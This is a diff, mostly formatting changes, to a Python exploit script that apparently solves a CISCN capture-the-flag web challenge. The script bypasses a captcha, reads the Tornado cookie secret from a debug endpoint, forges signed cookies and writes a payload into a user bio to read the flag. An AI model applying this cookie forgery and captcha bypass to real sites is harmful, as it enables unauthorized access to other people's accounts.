@@ -11,13 +11,16 @@ import requests
 from pyquery import PyQuery as PQ
 from tornado.escape import utf8
 
+
 def _create_signature_v2(secret, s):
     hash = hmac.new(utf8(secret), digestmod=hashlib.sha256)
     hash.update(utf8(s))
     return utf8(hash.hexdigest())
 
+
 def format_field(s):
     return utf8("%d:" % len(s)) + utf8(s)
+
 
 def sign_cookie(name, value, secret):
     timestamp = utf8(str(int(clock())))
@@ -35,9 +38,11 @@ def sign_cookie(name, value, secret):
     signature = _create_signature_v2(secret, to_sign)
     return to_sign + signature
 
+
 def get_uuid(html):
     dom = PQ(html)
     return dom('form canvas').attr('rel')
+
 
 def get_answer(html):
     uuid = get_uuid(html)
@@ -51,8 +56,10 @@ def get_answer(html):
     y = random.randint(int(float(answer['ans_pos_y_1'])), int(float(answer['ans_height_y_1']) + float(answer['ans_pos_y_1'])))
     return x, y
 
+
 def generate_randstr(len=10):
     return ''.join(random.sample(string.ascii_letters, len))
+
 
 def get_token(html, csrfname):
     dom = PQ(html)
@@ -60,12 +67,13 @@ def get_token(html, csrfname):
     token = str(PQ(form)("input[name=\"%s\"]" % csrfname).attr("value")).strip()
     return token
 
+
 def register(s, username, password, mail, csrfname, url, invite=''):
     rs = s.get(url + 'register')
     html = rs.text
     token = get_token(html, csrfname)
-    x,y = get_answer(html)
-    rs = s.post(url = url + 'register', data={
+    x, y = get_answer(html)
+    rs = s.post(url=url + 'register', data={
         csrfname: token,
         "username": username,
         "password": password,
@@ -89,12 +97,13 @@ def register(s, username, password, mail, csrfname, url, invite=''):
     print "[+] Register Success."
     return True
 
+
 def login(s, username, password, mail, csrfname, url):
     rs = s.get(url + 'login')
     html = rs.text
     token = get_token(html, csrfname)
-    x,y = get_answer(html)
-    rs = s.post(url = url + 'login', data={
+    x, y = get_answer(html)
+    rs = s.post(url=url + 'login', data={
         csrfname: token,
         "username": username,
         "password": password,
@@ -114,6 +123,7 @@ def login(s, username, password, mail, csrfname, url):
 
     print "[+] Login Success."
     return True
+
 
 def write_bio(s, payload, csrfname, url):
     rs = s.get(url + 'user')
@@ -136,16 +146,18 @@ def read_bio(s, url):
     rs = s.get(url + 'bio')
     flag = rs.text
     flag = flag.strip()
-    if re.match(r"CISCN{.*}",flag):
+    if re.match(r"CISCN{.*}", flag):
         print "[+] Read Bio Success"
         print flag
         return True
     print "[-] Read flag Failed"
     return False
 
+
 def get_secret(s, url):
     rs = s.get(url + "debugggg?info=data")
     return re.findall(r"cookie_secret = '(.*?)'", rs.text)[0]
+
 
 def _exp(ip, port):
     csrfname = "_xsrf"
@@ -167,20 +179,18 @@ def _exp(ip, port):
             return read_bio(s, url)
         return False
 
+
 def exp(host, port):
     attack = False
 
     try:
-        attack = _exp(host,port)
+        attack = _exp(host, port)
     except:
         print "[-] Attack Failed"
         attack = False
 
-    if attack:
-        return True
-    else:
-        return False
+    return bool(attack)
 
 
 if __name__ == "__main__":
-    exp("127.0.0.1","8233")
+    exp("127.0.0.1", "8233")
